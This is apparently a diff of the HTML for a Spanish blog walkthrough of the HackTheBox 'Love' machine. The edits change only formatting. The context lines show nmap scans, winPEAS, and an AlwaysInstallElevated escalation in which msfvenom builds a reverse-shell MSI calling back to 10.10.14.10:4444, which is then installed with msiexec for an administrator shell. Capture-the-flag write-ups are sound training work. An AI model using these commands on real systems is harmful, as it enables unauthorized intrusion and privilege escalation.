@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Love Machine - HackTheBox">
-	<meta name="twitter:description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Love Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
 
 <meta property="og:url" content="https://celero0.github.io/posts/love/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="Love Machine - HackTheBox">
-	<meta property="og:description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2025-11-24T19:39:22+00:00">
-		<meta property="article:modified_time" content="2025-11-24T19:39:22+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Love Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-24T19:39:22+00:00">
+    <meta property="article:modified_time" content="2025-11-24T19:39:22+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -192,7 +192,7 @@
 </h1>
 <p>Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.
 <strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.239 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.239 -oG allPorts
 </span></span></code></pre></div><img src="/images/Pasted image 20251108011547.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Vemos que en el puerto 443 que corresponde al servicio HTTPS, nos muestra información sobre un subdominio llamado <code>staging.love.htb</code></p>
 <img src="/images/Pasted image 20251108011952.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -206,7 +206,7 @@
   </a>
 </h1>
 <p>Primeramente corremos el script de nmap <code>http-enum</code> para realizar un fuzzeo rápido</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p80 --script http-enum 10.10.10.239
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p80 --script http-enum 10.10.10.239
 </span></span></code></pre></div><p>Encontrando los siguientes directorios:</p>
 <img src="/images/Pasted image 20251108181835.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Además vemos el puerto 5000 que corre el servicio <code>http</code> y el puerto 80.
@@ -279,11 +279,11 @@ Enumerando el puerto 5000 vemos que solo tenemos una página que nos muestra el 
 <p>Para descargarlo usaremos wget</p>
 <img src="/images/Pasted image 20251108190703.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Corremos el script con el siguiente comando, el script si no muestra nada mientras carga debemos esperar</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./winPEASx64.<span style="color:#79c0ff">exe</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./winPEASx64.<span style="color:#79c0ff">exe</span>
 </span></span></code></pre></div><p>Encontramos una forma de escalar privilegios</p>
 <img src="/images/Pasted image 20251108192234.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Tenemos los parámetros</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>AlwaysInstallElevated set to <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72">in</span> HKLM!
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>AlwaysInstallElevated set to <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72">in</span> HKLM!
 </span></span><span style="display:flex;"><span>AlwaysInstallElevated set to <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72">in</span> HKCU!
 </span></span></code></pre></div><p>Si vemos el link que nos recomiendan en hacktricks <code>https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated</code>
 Nos dice que podemos ejecutar archivos <code>.msi</code> como administrator</p>
@@ -291,14 +291,14 @@ Nos dice que podemos ejecutar archivos <code>.msi</code> como administrator</p>
 <p>y nos dan un script que permite agregar un usuario</p>
 <img src="/images/Pasted image 20251108192442.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Pero nosotros crearemos una reverse shell con <code>msfvenom</code> y se ejecutará como <code>administrator</code>, dandonos la shell con ese privilegio. Utilizaremos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp <span style="color:#79c0ff">LHOST</span><span style="color:#ff7b72;font-weight:bold">=</span>10.10.14.10 <span style="color:#79c0ff">LPORT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">4444</span> -f msi -o reverse.msi
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp <span style="color:#79c0ff">LHOST</span><span style="color:#ff7b72;font-weight:bold">=</span>10.10.14.10 <span style="color:#79c0ff">LPORT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">4444</span> -f msi -o reverse.msi
 </span></span></code></pre></div><img src="/images/Pasted image 20251108192826.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Compartimos el archivo con un servidor web, y nos ponemos en escucha en el puerto 4444</p>
 <img src="/images/Pasted image 20251108192907.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>y en la máquina víctima descargamos el archivo con wget</p>
 <img src="/images/Pasted image 20251108193002.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para correr nuestro <code>reverse.msi</code> utilizaremos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msiexec /quiet /i reverse.<span style="color:#79c0ff">msi</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msiexec /quiet /i reverse.<span style="color:#79c0ff">msi</span>
 </span></span></code></pre></div><p>Y obtenemos la consola como administrator</p>
 <img src="/images/Pasted image 20251108193111.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Y obtenemos la flag de root.txt</p>
